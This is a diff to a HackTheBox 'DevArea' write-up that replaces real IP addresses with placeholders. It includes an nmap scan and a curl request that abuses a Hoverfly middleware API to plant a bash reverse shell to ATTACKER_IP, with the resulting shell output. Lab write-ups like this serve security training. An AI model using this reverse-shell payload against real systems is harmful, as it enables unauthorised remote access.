@@ -1,6 +1,6 @@
 # DevArea - HackTheBox Writeup
 
-**Target:** `10.129.19.117`
+**Target:** `TARGET_IP`
 **Domain:** `devarea.htb`
 **OS:** Linux
 **Difficulty:** Medium
@@ -49,12 +49,12 @@ Root Shell → Root Flag
 
 ### Host Setup
 ```bash
-echo "10.129.19.117 devarea.htb" | sudo tee -a /etc/hosts
+echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
-nmap -sC -sV -p- 10.129.19.117
+nmap -sC -sV -p- TARGET_IP
 ```
 
 **Key Findings:**
@@ -212,7 +212,7 @@ curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
   -H "Content-Type: application/json" \
   -d '{
     "binary": "bash",
-    "script": "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.178/4444 0>&1"
+    "script": "#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
   }'
 ```
 
@@ -230,7 +230,7 @@ curl -x http://devarea.htb:8500 http://example.com
 
 **3. Reverse shell received:**
 ```bash
-connect to [10.10.14.178] from (UNKNOWN) [10.129.19.117] 4444
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
 dev_ryan@devarea:~$
